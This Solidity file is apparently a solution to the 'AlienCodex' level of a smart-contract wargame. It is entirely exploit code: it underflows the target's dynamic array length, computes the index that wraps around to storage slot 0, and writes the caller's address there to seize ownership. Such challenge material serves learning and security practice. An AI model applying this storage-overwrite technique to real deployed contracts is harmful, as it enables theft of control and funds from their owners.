// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import './19_AlienCodex.sol';

contract AlienCodexAttack {

  function attack(address _alienCodexAddr) public {
    AlienCodex(_alienCodexAddr).make_contact();  // to pass the contacted modifier
    AlienCodex(_alienCodexAddr).retract();  // create the underflow

    uint256 keccak_1 = uint256(keccak256(abi.encode(1)));
    uint256 i = 2**256 - 1 - keccak_1 + 1; // have to do -1 +1 to avoid TypeErrors
    AlienCodex(_alienCodexAddr).revise(i, bytes32(uint256(msg.sender)));
  }
  
}